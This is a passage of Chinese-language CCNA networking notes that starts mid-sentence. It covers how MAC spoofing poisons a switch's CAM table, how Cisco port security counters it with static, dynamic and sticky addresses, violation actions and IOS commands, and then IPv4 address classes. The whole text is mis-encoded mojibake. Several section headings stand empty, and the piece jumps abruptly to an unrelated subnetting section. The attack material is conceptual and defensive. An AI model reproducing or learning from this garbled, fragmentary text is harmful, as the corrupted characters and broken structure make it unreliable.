å·ä¸»æœºæ‰€å¯¹åº”çš„æ¡ç›®ï¼Œå°†å…¶æŒ‡å‘ FastEthernet 0/1 ç«¯å£ï¼Œè€Œä¸æ˜¯ 2 å·ä¸»æœºæ‰€çœŸæ­£è¿æ¥çš„ FastEthernet 0/2ã€‚æ­¤æ¦‚å¿µå¦‚å›¾ 4.4 æ‰€ç¤ºã€‚![&quot;MAC åœ°å€æ¬ºéª—&quot;](images/0404.png width=800)æ ¹æ®å›¾ 4.4, åœ¨ 3 å·ä¸»æœºæˆ– 4 å·ä¸»æœºå°è¯•å°†å¸§å‘ç»™ 2 å·ä¸»æœºæ—¶ï¼Œäº¤æ¢æœºä¼šå°†è¿™äº›å¸§è½¬å‘å‡º FastEthernet 0/1, åˆ° 1 å·ä¸»æœºï¼Œå› ä¸º CAM è¡¨å·²è¢« MAC åœ°å€æ¬ºéª—æ”»å‡»æŠ•æ¯’ã€‚åœ¨ 2 å·ä¸»æœºå‘å‡ºå¦ä¸€ä¸ªå¸§æ—¶ï¼Œäº¤æ¢æœºå†æ¬¡ä» FastEthernet 0/2 äº†è§£å…¶ MAC åœ°å€, å¹¶å†åº¦å°† CAM è¡¨æ¡ç›®é‡å†™ï¼Œä»¥ååº”å‡ºè¯¥å˜åŒ–ã€‚ç»“æœå°±å‡ºç° 2 å·ä¸»æœºä¸ 1 å·ä¸»æœºä¹‹é—´å°±è°ä¿æœ‰æ­¤ MAC åœ°å€çš„æ‹”æ²³ã€‚æ­¤å¤–ï¼Œè¿™ä¹Ÿå°†æ‰°ä¹±äº¤æ¢æœºï¼Œé€ æˆåå¤çš„é‡å†™ MAC åœ°å€è¡¨æ¡ç›®ï¼Œå¼•å‘åœ¨åˆæ³•ä¸»æœºï¼ˆä¹Ÿå°±æ˜¯ 2 å·ä¸»æœºï¼‰ä¸Šçš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDenial of Service , DoSï¼‰ã€‚è€Œå‡å¦‚å‡å†’çš„ MAC åœ°å€æ•°ç›®å¾ˆé«˜ï¼ŒMAC åœ°å€æ¬ºéª—æ”»å‡»è¿˜å°†å¯¹æŒç»­é‡å†™å…¶ CAM è¡¨çš„äº¤æ¢æœºçš„æ€§èƒ½é€ æˆä¸¥é‡å½±å“ã€‚åº”ç”¨ç«¯å£å®‰å…¨(implementing port security)ï¼Œå¯ä»¥å‡è½» MAC åœ°å€æ¬ºéª—æ”»å‡»çš„å½±å“ã€‚ åœ°å€å®‰å…¨çš„ç«¯å£å®‰å…¨ï¼ŒPort Security Secure Addresses12345678910ç»ç”±ç«¯å£å®‰å…¨ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šç‰¹å®š MAC æ‰è¢«å…è®¸è®¿é—®æŸä¸ªäº¤æ¢æœºç«¯å£ï¼ŒåŒæ—¶é™åˆ¶æŸä¸ªå•ä¸€äº¤æ¢æœºç«¯å£æ‰€æ”¯æŒçš„ MAC åœ°å€æ•°ç›®ã€‚ä»¥ä¸‹æœ¬èŠ‚æ‰€è¯´æ˜çš„å‡ ç§ç«¯å£å®‰å…¨åº”ç”¨æ–¹å¼ã€‚é™æ€ MAC åœ°å€ä¿å…¨, Static secure MAC addressesåŠ¨æ€ MAC åœ°å€ä¿å…¨, Dynamic secure MAC addressesç²˜æ» MAC åœ°å€ä¿å…¨, Sticky secure MAC addressesé™æ€ MAC åœ°å€ä¿å…¨æ˜¯ç”±ç½‘ç»œç®¡ç†å‘˜é™æ€é…ç½®ï¼Œå¹¶å­˜å‚¨åœ¨ MAC åœ°å€è¡¨ä¸­ï¼ŒåŒæ—¶è¿˜ä¿å­˜åœ¨äº¤æ¢æœºé…ç½®æ–‡ä»¶é‡Œã€‚å½“å°†é™æ€ MAC åœ°å€ä¿å…¨æŒ‡æ´¾ç»™æŸä¸ªå®‰å…¨ç«¯å£æ—¶ï¼Œäº¤æ¢æœºä¸ä¼šè½¬å‘é‚£äº›æºåœ°å€ä¸æ‰€é…ç½®çš„é™æ€å®‰å…¨ MAC åœ°å€ä¸åŒ¹é…çš„å¸§ã€‚åŠ¨æ€ MAC åœ°å€ä¿å…¨ï¼Œæ˜¯äº¤æ¢æœºæ‰€å­¦ä¹ åˆ°çš„ï¼Œå­˜å‚¨åœ¨ MAC åœ°å€è¡¨ä¸­ã€‚ä¸é™æ€ MAC åœ°å€å®‰å…¨ä¸åŒï¼Œåœ¨äº¤æ¢æœºé‡å¯æˆ–æ–­ç”µåï¼ŒåŠ¨æ€å®‰å…¨ MAC åœ°å€æ¡ç›®ä¼šä»äº¤æ¢æœºä¸­ç§»é™¤ã€‚åœ¨äº¤æ¢æœºå†æ¬¡å¯åŠ¨æ—¶ï¼Œè¿™äº›åœ°å€è¦å†æ¬¡ä¹ å¾—ã€‚ç²˜æ»çš„ MAC åœ°å€ä¿å…¨ï¼Œæ˜¯é™æ€å’ŒåŠ¨æ€ MAC åœ°å€ä¿å…¨çš„ç»“åˆã€‚åœ°å€å¯åŠ¨æ€ä¹ å¾—ï¼Œä¹Ÿå¯é™æ€é…ç½®ï¼Œå­˜å‚¨åœ¨ MAC åœ°å€è¡¨ä¸­ï¼Œä¹Ÿä¿å­˜åœ¨äº¤æ¢æœºé…ç½®æ–‡ä»¶é‡Œã€‚è¿™å°±æ„å‘³ç€åœ¨äº¤æ¢æœºå…³é—­æˆ–æ˜¯é‡å¯åï¼Œå®ƒæ— éœ€å†æ¬¡åŠ¨æ€å‘ç° MAC åœ°å€ï¼Œå› ä¸ºè¿™äº› MAC åœ°å€å·²ç»ä¿å­˜åœ¨é…ç½®æ–‡ä»¶ä¸­äº†ï¼ˆå¦‚ä½ æœ‰ä¿å­˜å…è®¸çš„é…ç½®ï¼‰ã€‚ åŠ¨ä½œçš„ç«¯å£å®‰å…¨ï¼ŒPort Security Actions12345678910111213ä¸€æ—¦å¼€å¯äº†ç«¯å£å®‰å…¨ï¼Œç®¡ç†å‘˜å°±å¯å®šä¹‰å‡ºåœ¨å‡ºç°è¿åç«¯å£å®‰å…¨äº‹ä»¶åï¼Œäº¤æ¢æœºæ‰€é‡‡å–çš„åŠ¨ä½œäº†ã€‚æ€ç§‘ IOS è½¯ä»¶å…è®¸ç®¡ç†å‘˜æŒ‡å®š 4 ç§åœ¨å‡ºç°å†²çªæ—¶æ‰€é‡‡å–çš„ä¸åŒåŠ¨ä½œã€‚ä¿æŠ¤ï¼ŒProtectå…³é—­ï¼ˆé»˜è®¤åŠ¨ä½œï¼‰, Shutdown(default)é™åˆ¶ï¼ŒRestrictå…³é—­ VLAN ï¼ˆè¶…å‡º CCNA å¤§çº²ï¼‰, Shutdown VLAN(outside of the CCNA syllabus)ä¿æŠ¤åŠ¨ä½œé€‰é¡¹å¼ºåˆ¶ç«¯å£è¿›å…¥å—ä¿æŠ¤ç«¯å£æ¨¡å¼ï¼ˆProtected Port modeï¼‰ã€‚æ­¤æ¨¡å¼ä¸‹ï¼Œäº¤æ¢æœºä¼šç®€å•åœ°ä¸¢å¼ƒæ‰€æœ‰æºåœ°å€ä¸æ˜çš„å•æ’­å’Œå¤šæ’­å¸§ï¼ˆsimply discard all Unicast or Multicast frames with unknown source MAC addressesï¼‰ã€‚è€Œåœ¨äº¤æ¢æœºè¢«é…ç½®ä¸ºä¿æŠ¤æŸç«¯å£æ—¶ï¼Œå½“å…¶ä»¥å—ä¿æŠ¤ç«¯å£æ¨¡å¼è¿è¡Œæ—¶ï¼Œä¸ä¼šå‘å‡ºé€šçŸ¥ï¼Œè¿™å°±æ„å‘³ç€ç”±å¤„äºæ­¤æ¨¡å¼ä¸‹çš„äº¤æ¢æœºç«¯å£é˜»æ­¢æ‰€æœ‰æµé‡æ—¶ï¼Œç®¡ç†å‘˜æ˜¯æ— æ³•è·çŸ¥çš„ã€‚å…³é—­åŠ¨ä½œé€‰é¡¹åˆ™æ˜¯åœ¨å‡ºç°è¿åç«¯å£å®‰å…¨åï¼Œå°†æŸç«¯å£ç½®äºæŸç§é”™è¯¯å…³é—­çŠ¶æ€ï¼ˆan err-disabled stateï¼‰ã€‚åœ¨æ­¤é…ç½®åŠ¨ä½œè¢«ç”¨åˆ°æ—¶ï¼Œäº¤æ¢æœºä¸Šç›¸åº”ç«¯å£çš„ LED åŒæ—¶è¢«å…³é—­ã€‚è€Œåœ¨å…³é—­æ¨¡å¼ä¸‹ï¼Œäº¤æ¢æœºå‘å‡ºä¸€æ¡ SNMP trap (æµ…è°ˆ Linux ç³»ç»Ÿä¸­çš„ SNMP trap), ä»¥åŠä¸€æ¡ syslog æ¶ˆæ¯ï¼ŒåŒæ—¶å†²çªè®¡æ•°å™¨ä¼šå¢å¤§ã€‚è¿™ä¸ªé€‰é¡¹æ˜¯æ¥å£é…ç½®äº†ç«¯å£å®‰å…¨æ—¶çš„é»˜è®¤åŠ¨ä½œã€‚é™åˆ¶åŠ¨ä½œé€‰é¡¹æ˜¯åœ¨å®‰å…¨ MAC åœ°å€æ•°ç›®åˆ°è¾¾ç®¡ç†å‘˜ä¸ºè¯¥ç«¯å£æ‰€å®šä¹‰çš„æœ€å¤§é™åˆ¶æ—¶ï¼Œç”¨äºä¸¢å¼ƒé‚£äº›å¸¦æœ‰ä¸æ˜ MAC åœ°å€çš„æ•°æ®åŒ…ã€‚æ­¤æ¨¡å¼ä¸‹ï¼Œäº¤æ¢æœºä¼šæŒç»­é™åˆ¶é¢å¤–çš„é‚£äº› MAC åœ°å€å‘å‡ºå¸§ï¼Œç›´åˆ°ç§»é™¤å¯¹é‚£äº›å®‰å…¨ MAC åœ°å€æ•°ç›®çš„é™åˆ¶ï¼Œæˆ–ç›´åˆ°æ‰€å…è®¸çš„æœ€å¤§åœ°å€æ•°ç›®å¾—ä»¥å¢åŠ ã€‚å’Œå…³é—­å·¥ä½œé€‰é¡¹ä¸€æ ·ï¼Œäº¤æ¢æœºä¹Ÿä¼šå‘å‡ºä¸€æ¡ SNMP trap åŠä¸€æ¡ syslog æ¶ˆæ¯ï¼ŒåŒæ—¶å†²çªè®¡æ•°å™¨ä¼šå¢åŠ ã€‚å…³é—­ VLAN åŠ¨ä½œé€‰é¡¹è·Ÿå…³é—­åŠ¨ä½œé€‰é¡¹ç±»ä¼¼ï¼›ä¸è¿‡æ­¤é€‰é¡¹æ˜¯å…³é—­æŸä¸ª VLAN, è€Œä¸æ˜¯æŸä¸ªäº¤æ¢æœºç«¯å£ã€‚æ­¤é…ç½®å¯èƒ½ä¼šåº”ç”¨åœ¨é‚£äº›æŒ‡æ´¾äº†å¤šä¸ª VLANï¼Œ è¯¸å¦‚è¯­éŸ³ VLAN å’Œæ•°æ® VLANï¼Œ çš„ç«¯å£ä¸Šï¼Œä»¥åŠäº¤æ¢æœºçš„ä¸­ç»§é“¾è·¯ä¸Šã€‚ ç«¯å£å®‰å…¨é…ç½®ï¼Œ Configuring Port Security12345678910111213141516åœ¨é…ç½®ç«¯å£å®‰å…¨ä¹‹å‰ï¼Œå»ºè®®å°†äº¤æ¢æœºç«¯å£é™æ€é…ç½®ä¸ºäºŒå±‚æ¥å…¥ç«¯å£ï¼ˆç«¯å£å®‰å…¨åªèƒ½é…ç½®ä¸ºé™æ€æ¥å…¥ç«¯å£æˆ–ä¸­ç»§ç«¯å£ä¸Šï¼Œä¸èƒ½é…ç½®åœ¨åŠ¨æ€ç«¯å£ä¸Šï¼‰ã€‚æ­¤é…ç½®å¦‚ä¸‹é¢çš„è¾“å‡ºæ‰€ç¤ºã€‚VTP-Server-1(config)#interface FastEthernet0/1VTP-Server-1(config-if)#switchportVTP-Server-1(config-if)#switchport mode accessæ³¨æ„: åœ¨è¯¸å¦‚ Catalyst 2950 åŠ Catalyst 2960 ç³»åˆ—çš„äºŒå±‚äº¤æ¢æœºä¸Šæ— éœ€ switchport å‘½ä»¤ã€‚è€Œåœ¨æ¯”å¦‚ Catalyst 3750ã€Catalyst 4500 ä»¥åŠ Catalyst 6500 ç³»åˆ—ç­‰çš„å¤šå±‚äº¤æ¢æœºä¸Šï¼Œ å®ƒæ˜¯è¦è¦åˆ°çš„ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œç«¯å£å®‰å…¨æ˜¯å…³é—­çš„ï¼›ä½†å¯é€šè¿‡æ¥å£é…ç½®å‘½ä»¤ switchport port-security [mac-address &#123;mac-address&#125; [vlan &#123;vlan-id | &#123;access | voice&#125;&#125;] | mac-address &#123;sticky&#125; [mac-address | vlan &#123;vlan-id | &#123;access | voice&#125;&#125;] [maximum &#123;value&#125; [vlan &#123;vlan-list | &#123;access | voice&#125;&#125;]] äºˆä»¥å¼€å¯ã€‚è¡¨ 4.1 è¯´æ˜äº†è¯¥å‘½ä»¤çš„è¿™äº›é€‰é¡¹ã€‚å…³é”®å­— è¯´æ˜mac-address &#123;mac-address&#125; æ­¤å…³é”®å­—ç”¨äºæŒ‡å®šä¸€ä¸ªé™æ€ä¿å…¨ MAC åœ°å€ã€‚ä½ è¿˜å¯ä»¥åŠ å…¥ä¸è¶…è¿‡é…ç½®çš„æœ€å¤§æ•°ç›®çš„å…¶å®ƒå®‰å…¨ MAC åœ°å€ã€‚vlan &#123;vlan id&#125; æ­¤å…³é”®å­—åº”åªä½¿ç”¨åœ¨æŸä¸ªä¸­ç»§ç«¯å£ä¸Šï¼Œä»¥æŒ‡å®š VLAN ID å’Œ MAC åœ°å€ã€‚å¦‚æ²¡æœ‰æŒ‡å®š VLAN IDï¼Œå°±ä½¿ç”¨åŸç”Ÿ VLANã€‚vlan &#123;access&#125; æ­¤å…³é”®å­—åº”åªç”¨åœ¨æŸä¸ªæ¥å…¥ç«¯å£ä¸Šï¼Œä»¥æŒ‡å®šè¯¥ VLAN ä½œä¸ºæ¥å…¥ VLANã€‚vlan &#123;voice&#125; æ­¤å…³é”®å­—åº”åªç”¨åœ¨æŸä¸ªæ¥å…¥ç«¯å£ä¸Š, ç”¨ä»¥çŸ¥é“è¯¥ VLAN ä½œä¸ºä¸€ä¸ªè¯­éŸ³ VLANã€‚è€Œåªæœ‰åœ¨è¯¥ç‰¹å®šç«¯å£ä¸Šé…ç½®äº†è¯­éŸ³ VLAN æ—¶ï¼Œè¯¥é€‰é¡¹æ‰å¯ç”¨ã€‚mac-address &#123;sticky&#125; [mac-address] æ­¤å…³é”®å­—ç”¨äºåœ¨ç‰¹å®šæ¥å£ä¸Šå¼€å¯åŠ¨æ€æˆ–åœ°å€ç²˜æ»å­¦ä¹ ï¼ˆused to enable dynamic or sticky learningï¼‰ï¼Œæˆ–è€…ä¸ºå…¶é…ç½®ä¸€ä¸ªé™æ€å®‰å…¨ MAC åœ°å€ã€‚maxium &#123;value&#125; æ­¤å…³é”®å­—ç”¨äºæŒ‡å®šæŸä¸ªæ¥å£ä¸Šå¯ä»¥å­¦åˆ°çš„å®‰å…¨åœ°å€çš„æœ€å¤§æ•°ç›®ã€‚é»˜è®¤æ˜¯ 1ã€‚ é™æ€å®‰å…¨åœ°å€é…ç½®ï¼Œ Configuring Static Secure MAC Addresses1234567891011121314151617181920212223242526272829ä¸‹é¢çš„è¾“å‡ºæ¼”ç¤ºäº†æ€æ ·åœ¨æŸä¸ªæ¥å£ä¸Šå¼€å¯ç«¯å£å®‰å…¨ï¼Œä»¥åŠåœ¨æŸä¸ªäº¤æ¢æœºæ¥å…¥ç«¯å£ä¸Šé…ç½®ä¸€ä¸ªé™æ€å®‰å…¨ MAC åœ°å€ 001f:3c59:d63bã€‚VTP-Server-1(config)#interface GigabitEthernet0/2VTP-Server-1(config-if)#switchportVTP-Server-1(config-if)#switchport mode accessVTP-Server-1(config-if)#switchport port-securityVTP-Server-1(config-if)#switchport port-security mac-address 001f.3c59.d63bä¸‹é¢çš„è¾“å‡ºæ¼”ç¤ºäº†æ€æ ·åœ¨æŸä¸ªæ¥å£ä¸Šå¼€å¯ç«¯å£å®‰å…¨ï¼Œå¹¶åœ¨æŸä¸ªäº¤æ¢æœºä¸­ç»§ç«¯å£çš„ VLAN 5 ä¸­é…ç½®ä¸€ä¸ªé™æ€å®‰å…¨ MAC åœ°å€ 001f:3c59:d63bã€‚VTP-Server-1(config)#interface GigabitEthernet0/2VTP-Server-1(config-if)#switchportVTP-Server-1(config-if)#switchport trunk encapsulation dot1qVTP-Server-1(config-if)#switchport mode trunkVTP-Server-1(config-if)#switchport port-securityVTP-Server-1(config-if)#switchport port-security mac-address 001f.3c59.d63b vlan 5è€Œä¸‹é¢çš„è¾“å‡ºåˆ™æ¼”ç¤ºäº†å¦‚ä½•åœ¨æŸä¸ªæ¥å£ä¸Šå¼€å¯ç«¯å£å®‰å…¨ï¼Œå¹¶åœ¨æŸä¸ªäº¤æ¢æœºæ¥å…¥ç«¯å£çš„ VLAN 5(æ•°æ® VLANï¼‰ å’Œ VLAN 7(è¯­éŸ³ VLANï¼‰ï¼Œåˆ†åˆ«é…ç½®ä¸€ä¸ªé™æ€å®‰å…¨ MAC åœ°å€ 001f:3c59:5555 å’Œ 001f:3c59:7777ã€‚VTP-Server-1(config)#interface GigabitEthernet0/2VTP-Server-1(config-if)#switchportVTP-Server-1(config-if)#switchport mode accessVTP-Server-1(config-if)#switchport access vlan 5VTP-Server-1(config-if)#switchport voice vlan 7VTP-Server-1(config-if)#switchport port-securityVTP-Server-1(config-if)#switchport port-security maximum 2VTP-Server-1(config-if)#switchport port-security mac-address 001f.3c59.5555 vlan accessVTP-Server-1(config-if)#switchport port-security mac-address 001f.3c59.7777 vlan voiceè®°ä½åœ¨æŸä¸ªåŒæ—¶é…ç½®äº†è¯­éŸ³ VLAN å’Œæ•°æ® VLAN çš„æ¥å£ä¸Šå¼€å¯ç«¯å£å®‰å…¨æ—¶ï¼Œè¯¥ç«¯å£ä¸Šçš„æœ€å¤§å…è®¸å®‰å…¨åœ°å€æ•°åº”è®¾ç½®ä¸º 2ï¼Œè¿™ä¸€ç‚¹éå¸¸é‡è¦ã€‚è¿™åˆæ˜¯é€šè¿‡åŒ…å«åœ¨ä¸Šé¢è¾“å‡ºä¸­çš„æ¥å£é…ç½®å‘½ä»¤ switchport port-security maxium 2 å®Œæˆçš„ã€‚ä¸¤ä¸ª MAC åœ°å€ä¸­çš„ä¸€ä¸ªç”± IP ç”µè¯ä½¿ç”¨ï¼Œäº¤æ¢æœºåœ¨è¯­éŸ³ VLAN ä¸Šå­¦åˆ°æ­¤åœ°å€ã€‚å¦ä¸€ä¸ªç”±å¯è¿æ¥åœ¨ IP ç”µè¯ä¸Šçš„ä¸»æœºï¼ˆæ¯”å¦‚ PCï¼‰æ‰€ä½¿ç”¨ã€‚äº¤æ¢æœºå°†åœ¨æ•°æ® VLAN ä¸Šå­¦åˆ°è¿™ä¸ª MAC åœ°å€ã€‚ é™æ€å®‰å…¨åœ°å€é…ç½®çš„éªŒè¯ï¼ŒVerifying Static Secure MAC Address Configuration123456789101112131415161718192021222324252627282930313233343536373839åŒè¿‡æ‰§è¡Œ show port-security å‘½ä»¤ï¼Œå¯ä»¥éªŒè¯å…¨å±€ç«¯å£å®‰å…¨é…ç½®å‚æ•°ï¼ˆglobal port security configuration parametersï¼‰ã€‚ä¸‹é¢å±•ç¤ºäº†é»˜è®¤å€¼ä¸‹çš„æ­¤å‘½ä»¤çš„æ‰“å°è¾“å‡ºã€‚VTP-Server-1#show port-securitySecure Port MaxSecureAddr CurrentAddr SecurityViolation Security Action (Count) (Count) (Count)-------------------------------------------------------Gi0/2 1 1 0 Shutdown------------------------------------------------------------------Total Addresses in System : 1Max Addresses limit in System : 1024å¦‚åŒä¸Šé¢çš„è¾“å‡ºä¸­æ‰€è§åˆ°çš„é‚£æ ·ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªç«¯å£ä¸Šä»…å…è®¸ä¸€ä¸ªå®‰å…¨ MAC åœ°å€ã€‚æ­¤å¤–ï¼Œåœ¨å‡ºç°å†²çªäº‹ä»¶æ—¶çš„é»˜è®¤åŠ¨ä½œå°±æ˜¯å…³é—­ç«¯å£ã€‚ç²—ä½“æ–‡æœ¬è¡¨æ˜ï¼Œå·²çŸ¥ä»…æœ‰ä¸€ä¸ªå®‰å…¨åœ°å€ï¼Œå°±æ˜¯é…ç½®åœ¨æ¥å£ä¸Šçš„é™æ€åœ°å€ã€‚ç»ç”±æ‰§è¡Œ show port-security interface [name] äº¦å¯ç¡®è®¤åŒæ ·çš„å‚æ•°ï¼Œå¦‚ä¸‹é¢çš„è¾“å‡ºæ‰€ç¤ºã€‚VTP-Server-1#show port-security interface gi0/2Port Security : EnabledPort status : SecureUpViolation mode : ShutdownMaximum MAC Addresses : 1Total MAC Addresses : 1Configured MAC Addresses : 1Sticky MAC Addresses : 0Aging time : 0 minsAging type : AbsoluteSecureStatic address aging : DisabledSecurity Violation count : 0æ³¨æ„ï¼š åœ¨æˆ‘ä»¬è¿›ä¸€æ­¥å­¦ä¹ æœ¬ç« å†…å®¹çš„è¿‡ç¨‹ä¸­ï¼Œå°†ä¼šè¯¦ç»†ä»‹ç»å¯¹ä¸Šé¢çš„è¾“å‡ºä¸­å…¶å®ƒé»˜è®¤å‚æ•°çš„ä¿®æ”¹ã€‚è€Œè¦æŸ¥çœ‹è¯¥ç«¯å£ä¸Šå…·ä½“é…ç½®çš„é™æ€å®‰å…¨ MAC åœ°å€ï¼Œå°±è¦ç”¨åˆ° show port-security address æˆ–è€… show running-config interface [name] å‘½ä»¤äº†ã€‚ä»¥ä¸‹è¾“å‡ºæ¼”ç¤ºäº† show port-security addressã€‚VTP-Server-1#show port-security address Secure Mac Address Table-------------------------------------------------------------------Vlan Mac Address Type Ports Remaining Age (mins)---- ----------- ---- ----- ----------- 1 001f.3c59.d63b SecureConfigured Gi0/2 ---------------------------------------------------------------------Total Addresses in System : 1Max Addresses limit in System : 1024 åŠ¨æ€å®‰å…¨ MAC åœ°å€çš„é…ç½®ï¼ŒConfiguring Dynamic Secure MAC Address123456789101112131415161718é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“æŸä¸ªç«¯å£çš„ç«¯å£å®‰å…¨å¼€å¯æ—¶ï¼Œè¯¥ç«¯å£æ— éœ€ç®¡ç†å‘˜åšä»»ä½•é…ç½®ï¼Œå°±ä¼šåŠ¨æ€å­¦ä¹ å¹¶å°†å­¦ä¹ åˆ°çš„ MAC åœ°å€è®¾ä¸ºå®‰å…¨ MAC åœ°å€ã€‚è€Œè¦ä»¤åˆ°è¯¥ç«¯å£å­¦åˆ°ä¸æ­¢ä¸€ä¸ª MAC åœ°å€å¹¶å°†å®ƒä»¬è®¾ä¸ºå®‰å…¨ MAC åœ°å€ï¼Œå°±è¦ä½¿ç”¨å‘½ä»¤ switchport port-security maxium [number]ã€‚è®°ä½ [number] å…³é”®å­—æ˜¯ä¾å¹³å°è€Œå®šçš„ï¼Œåœ¨ä¸åŒçš„æ€ç§‘ Catalyst äº¤æ¢æœºå‹å·ä¸Šä¼šæœ‰æ‰€ä¸åŒã€‚&quot;ç°å®åœºæ™¯&quot;ç°å®åœºæ™¯éƒ¨ç½²ï¼ŒReal-World Implementationåœ¨ä½¿ç”¨æ€ç§‘ Catalyst 3750 äº¤æ¢æœºçš„ç”Ÿäº§ç½‘ç»œä¸­ï¼Œäº‹å…ˆç¡®å®šä¸‹æ¥æŸå°ç‰¹å®šäº¤æ¢æœºçš„ç”¨é€”ï¼Œæ€»æ˜¯ä¸€ä¸ªå¥½ä¸»æ„ï¼Œæ¥ç€å°±å¯ä»¥é€šè¿‡å…¨å±€é…ç½®å‘½ä»¤ï¼ˆglobal configuration commandï¼‰ sdm prefer &#123;access | default | dual-ipv4-ipv6 &#123;default | routing | vlan&#125; | routing | vlan&#125; [desktop], é€‰å®šæ°å½“çš„äº¤æ¢æœºæ•°æ®åº“ï¼ˆSwitch Database Management, SDMï¼‰æ¨¡æ¿ã€‚å„ä¸ª SDM æ¨¡æ¿ä»¥æ”¯æŒæ­£åœ¨æˆ–å³å°†ç”¨åˆ°çš„é‚£äº›ç‰¹æ€§çš„æœ€ä¼˜æ–¹å¼ï¼Œæ¥åˆ†é…ç³»ç»Ÿèµ„æºã€‚é»˜è®¤çš„ SDM æ¨¡æ¿åˆ™æ˜¯å°è¯•åœ¨å„é¡¹ç‰¹æ€§é—´æä¾›ä¸€ç§å¹³è¡¡ã€‚å› æ­¤ï¼Œä¼šå½±å“å…¶å®ƒå„é¡¹ç‰¹æ€§å’ŒåŠŸèƒ½çš„æœ€å¤§æ€§èƒ½å€¼ã€‚ä¸€ä¸ªä¾‹å­å°±æ˜¯åœ¨é‡‡è¡Œç«¯å£å®‰å…¨æ—¶ï¼Œæ‰€èƒ½å­¦åˆ°æˆ–é…ç½®ä¸Šçš„å®‰å…¨ MAC åœ°å€æœ€å¤§å¯èƒ½æ•°ä¼šå‡å°‘ã€‚ä¸‹é¢çš„è¾“å‡ºæ¼”ç¤ºäº†æ€æ ·å°†äº¤æ¢æœºç«¯å£ï¼Œæ¥å£ GigabitEthernet0/2, é…ç½®ä¸ºåŠ¨æ€å­¦ä¹ å¹¶å°†è‡³å¤šä¸¤ä¸ª MAC åœ°å€è®¾ä¸ºå®‰å…¨ MAC åœ°å€ã€‚VTP-Server-1(config)#interface GigabitEthernet0/2VTP-Server-1(config-if)#switchportVTP-Server-1(config-if)#switchport mode accessVTP-Server-1(config-if)#switchport port-securityVTP-Server-1(config-if)#switchport port-security maximum 2 éªŒè¯åŠ¨æ€ MAC åœ°å€ä¿å…¨ï¼ŒVerifying Dynamic Secure MAC Addressedé…ç½®ä¿å…¨ MAC åœ°å€ç²˜æ»ï¼ŒConfiguring Sticky Secure MAC Addresses é…ç½®ç«¯å£å®‰å…¨å†²çªçš„åŠ¨ä½œï¼Œ Configuring the Port Security Violation Action å¯¹ç«¯å£å®‰å…¨å†²çªåŠ¨ä½œçš„éªŒè¯ï¼ŒVerifying the Port Security Violation Action ipåœ°å€åˆ†é…ä¸Šé¢çš„åŸºç¡€çŸ¥è¯†ï¼Œæ˜¯ IP å¯»å€å’Œå­ç½‘åˆ’åˆ†çš„åŸºç¡€ã€‚ ä¸‹é¢çš„å¯¹ä½ ç°åœ¨æ‰€æŒæ¡çš„è¿›è¡Œäº†æ€»ç»“ã€‚è¿™äº›å€¼å¯ç”¨ä½œä»»æ„å­ç½‘æ©ç ï¼Œæ‰€ä»¥è¯·ç•™å¿ƒä¸€ä¸‹ã€‚ ** äºŒè¿›åˆ¶å€¼ï¼ŒBinary Values** äºŒè¿›åˆ¶ï¼ŒBinary åè¿›åˆ¶ï¼ŒDecimal 1000 0000 128 1100 0000 192 1110 0000 224 1111 0000 240 1111 1000 248 1111 1100 252 1111 1110 254 1111 1111 255 ipè§„åˆ™ a,bcç±»åœ°å€123456789101112131415161718192021222324252627282930åœ¨ IPv4 åˆšæ¨å‡ºæ—¶ï¼Œå…¶åœ°å€å°±åˆ†æˆäº†ä¸åŒç±»åˆ«ã€‚ä¸åŒåœ°å€ç±»åˆ«ä¾å…¶éœ€æ±‚è€Œåˆ†é…ç»™å„å®¶æœºæ„ã€‚æœºæ„è¶Šå¤§ï¼Œåœ°å€ç±»åˆ«å°±è¶Šå¤§ã€‚ä¸åŒåœ°å€ç±»åˆ«åˆæŒ‡å®šäº†ç›¸åº”å­—æ¯ï¼Œä»Aåˆ°Eã€‚A ç±»åœ°å€ä¿ç•™ç»™æœ€å¤§çš„ä¸€äº›ç½‘ç»œã€‚è€ŒAç±»åœ°å€çš„å‰8ä¸ªäºŒè¿›åˆ¶ä½å¯ä»¥æ˜¯ä»1åˆ°126çš„æ•°ã€‚æ­¤ä¸¾çš„åŸå› åœ¨äºå…¶å‰ 8 ä½çš„é¦–ä½å¿…é¡»æ˜¯0ã€‚è€Œå½“å‰8ä½ä¸­æœ‰äº†ç¬¬ä¸€ä½çš„0æ—¶ï¼Œé‚£ä¹ˆå‰©ä¸‹çš„å€¼å°±åªèƒ½æ˜¯1åˆ°126äº†ã€‚ä¹Ÿå°±æ˜¯ä¸‹é¢è¿™æ ·ã€‚0000 0001 = 10111 1111 = 127åœ¨ç½‘ç»œä¸­ï¼Œæ˜¯ä¸å¯ä»¥æœ‰å…¨0åœ°å€çš„ã€‚åœ¨åŠ å…¥å…¶å®ƒä¸‰ä¸ª8ä½äºŒè¿›åˆ¶æ•°åï¼Œå°±å¯ä»¥çœ‹åˆ°Aç±»åœ°å€çš„å…¨è²Œäº†ã€‚å°±åƒä¸‹é¢çš„é‚£æ ·ã€‚10.1.1.1120.2.3.4126.200.133.1è¿™äº›éƒ½æ˜¯Aç±»åœ°å€ï¼Œå› ä¸ºå®ƒä»¬éƒ½æ˜¯åœ¨1åˆ°126çš„èŒƒå›´å†…ã€‚127ä¸æ˜¯ IP åœ°å€æ‰€å…è®¸çš„æ•°å­—ï¼›127.0.0.1å®é™…ä¸Šç”¨äºåœ¨è®¾å¤‡ä¸Šæµ‹è¯•TCP/IPæ˜¯å¦æ­£å¸¸ã€‚Bç±»åœ°å€å‰8ä½äºŒè¿›åˆ¶æ•°çš„å¤´ä¸¤ä½åˆ™å¿…é¡»æ˜¯ 10 ã€‚è¿™å°±æ„å‘³ç€å‰8ä½äºŒè¿›åˆ¶æ•°å€¼å¤„äº128åˆ°191ä¹‹é—´ï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢è¿™æ ·ã€‚1000 0000 = 1281011 1111 = 191å¯¹äºCç±»åœ°å€æ¥è¯´ï¼Œå‰8ä½äºŒè¿›åˆ¶æ•°çš„å¤´ä¸‰ä½å¿…éœ€ä¸º110, é‚£ä¹ˆåœ°å€å°±åœ¨192åˆ°223ä¹‹é—´ï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢è¿™æ ·ã€‚1100 0000 = 1921101 1111 = 